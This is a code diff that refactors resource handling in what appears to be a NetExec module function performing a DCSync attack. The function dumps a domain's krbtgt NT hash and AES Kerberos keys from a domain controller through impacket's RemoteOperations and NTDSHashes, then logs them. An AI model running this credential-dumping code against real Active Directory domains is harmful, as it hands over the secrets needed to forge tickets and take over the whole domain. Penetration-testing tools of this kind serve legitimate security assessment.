@@ -144,45 +144,41 @@ class NXCModule:
 
     def _dcsync_krbtgt(self, smb_conn, ldap_conn):
         try:
-            rop = RemoteOperations(
-                smb_conn,
-                doKerberos=ldap_conn.kerberos,
-                kdcHost=ldap_conn.kdcHost,
-            )
-            rop.enableRegistry()
-            boot_key = rop.getBootKey()
+            with RemoteOperations(smb_conn, doKerberos=ldap_conn.kerberos, kdcHost=ldap_conn.kdcHost) as rop:
+                rop.enableRegistry()
+                boot_key = rop.getBootKey()
 
-            domain_netbios = self._get_domain_netbios(ldap_conn)
-            target_user = f"{domain_netbios}/krbtgt"
+                domain_netbios = self._get_domain_netbios(ldap_conn)
+                target_user = f"{domain_netbios}/krbtgt"
 
-            def grab_hash(secret_type, secret):
-                if secret_type == NTDSHashes.SECRET_TYPE.NTDS:
-                    self.krbtgt_hash = secret
-                elif secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
-                    if "aes256-cts-hmac-sha1-96" in secret.lower():
-                        self.aes256_key = secret.split(":")[-1]
-                    elif "aes128-cts-hmac-sha1-96" in secret.lower():
-                        self.aes128_key = secret.split(":")[-1]
+                def grab_hash(secret_type, secret):
+                    if secret_type == NTDSHashes.SECRET_TYPE.NTDS:
+                        self.krbtgt_hash = secret
+                    elif secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
+                        if "aes256-cts-hmac-sha1-96" in secret.lower():
+                            self.aes256_key = secret.split(":")[-1]
+                        elif "aes128-cts-hmac-sha1-96" in secret.lower():
+                            self.aes128_key = secret.split(":")[-1]
 
-            ntds = NTDSHashes(
-                None,
-                boot_key,
-                isRemote=True,
-                noLMHash=True,
-                remoteOps=rop,
-                justNTLM=self.etype == "rc4",
-                justUser=target_user,
-                printUserStatus=False,
-                perSecretCallback=grab_hash,
-            )
-            ntds.dump()
+                ntds = NTDSHashes(
+                    None,
+                    boot_key,
+                    isRemote=True,
+                    noLMHash=True,
+                    remoteOps=rop,
+                    justNTLM=self.etype == "rc4",
+                    justUser=target_user,
+                    printUserStatus=False,
+                    perSecretCallback=grab_hash,
+                )
+                ntds.dump()
 
-            secret = {"rc4": self.krbtgt_hash, "aes128": self.aes128_key, "aes256": self.aes256_key}.get(self.etype)
-            label = "hash" if self.etype == "rc4" else f"{self.etype.upper()} key"
-            if secret:
-                self.context.log.highlight(f"krbtgt {label}: {secret}")
-            else:
-                self.context.log.fail(f"DCSync completed - krbtgt {label} not found!")
+                secret = {"rc4": self.krbtgt_hash, "aes128": self.aes128_key, "aes256": self.aes256_key}.get(self.etype)
+                label = "hash" if self.etype == "rc4" else f"{self.etype.upper()} key"
+                if secret:
+                    self.context.log.highlight(f"krbtgt {label}: {secret}")
+                else:
+                    self.context.log.fail(f"DCSync completed - krbtgt {label} not found!")
         except DCERPCSessionError as e:
             self.context.log.fail(f"RPC DRSUAPI error: {e}")
         except Exception as e:
@@ -191,9 +187,6 @@ class NXCModule:
             with suppress(Exception):
                 if ntds:
                     ntds.finish()
-            with suppress(Exception):
-                if rop:
-                    rop.finish()
             with suppress(Exception):
                 smb_conn.logoff()
 
